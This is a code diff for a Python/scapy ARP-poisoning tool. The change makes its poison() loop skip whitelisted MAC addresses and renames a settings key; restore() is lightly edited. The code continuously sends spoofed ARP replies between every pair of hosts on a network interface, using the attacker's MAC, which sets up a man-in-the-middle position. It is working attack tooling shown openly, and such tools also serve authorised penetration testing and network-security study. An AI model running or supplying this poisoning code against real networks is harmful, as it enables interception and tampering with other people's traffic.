@@ -10,9 +10,8 @@ from scapy.sendrecv import sendp
 
 def poison(interface: str, settings: dict):
     print('Continuously ARP poisoning hosts on ' + interface)
-    hosts_dictionary: dict = settings['poisoned hosts'][interface]
-    whitelist_dictionary: dict = settings['whitelist poisoned hosts'][interface]
-    # Todo: make sure whitelist is not poisoned
+    hosts_dictionary: dict = settings['hosts'][interface]
+    whitelist_iter: iter = settings['whitelist poisoned hosts'][interface]
     lock: Lock = settings['locks'][interface]
     attacker_mac = get_if_hwaddr(interface)
 
@@ -35,22 +34,24 @@ def poison(interface: str, settings: dict):
         # Find all combinations of hosts
         lock.acquire()
         for host_mac in hosts_dictionary:
-            for host2_mac in hosts_dictionary:
-                # Check if the two hosts are not identical
-                if host_mac != host2_mac:
-                    # Find all IP addresses of hosts
-                    for host_ip in hosts_dictionary[host_mac]:
-                        for host2_ip in hosts_dictionary[host2_mac]:
-                            # Poison them one way
-                            # Second way is included in another iteration
-                            send_arp_poison(host_mac, host_ip, host2_ip)
+            if host_mac not in whitelist_iter:
+                for host2_mac in hosts_dictionary:
+                    if host2_mac not in whitelist_iter:
+                        # Check if the two hosts are not identical
+                        if host_mac != host2_mac:
+                            # Find all IP addresses of hosts
+                            for host_ip in hosts_dictionary[host_mac]:
+                                for host2_ip in hosts_dictionary[host2_mac]:
+                                    # Poison them one way
+                                    # Second way is included in another iteration
+                                    send_arp_poison(host_mac, host_ip, host2_ip)
         lock.release()
         sleep(settings['arp poison frequency'])
 
 
 def restore(interface, settings):
     print('Restoring ARP caches on ' + interface)
-    hosts_dictionary = settings['poisoned hosts'][interface]
+    hosts_dictionary = settings['hosts'][interface]
     lock = settings['locks'][interface]
     attacker_mac = get_if_hwaddr(interface)
 
